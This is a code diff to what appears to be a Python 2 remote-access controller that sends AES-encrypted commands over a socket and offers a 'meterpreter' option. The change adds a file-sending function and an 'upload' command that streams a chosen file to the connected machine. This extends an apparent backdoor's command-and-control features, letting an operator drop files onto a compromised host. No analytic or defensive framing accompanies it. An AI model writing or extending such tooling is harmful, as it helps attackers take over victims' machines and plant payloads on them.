@@ -157,6 +157,19 @@ def encodeCipher(aes, data):
     encryp_msg = aes.encrypt(data)
     return base64.b64encode(encryp_msg)
 
+#Sent File Method
+def sent(con, file):
+    f = open(file,'rb')
+    print 'Sending...'
+    l = f.read(1024)
+    while (l):
+        print 'Sending...'
+        con.send(l)
+        l = f.read(1024)
+    f.close()
+    con.send('File has been sent')
+    print "Done Sending"
+
 
 def main():
     #CipherAES Object
@@ -187,6 +200,11 @@ def main():
             while True:
                 cmd = raw_input("Enter command: ")
                 if cmd:
+                    if cmd == 'upload':
+                        req_str = option(con, aes, cmd)
+                        fileName = raw_input("¿Cuál es el nombre del fichero?: ")
+                        req_str = option(con, aes, fileName)
+                        sent(con, fileName)
                     if code == "1" and cmd == "meterpreter":
                         cmd = meterpreter()
                         code = "0"
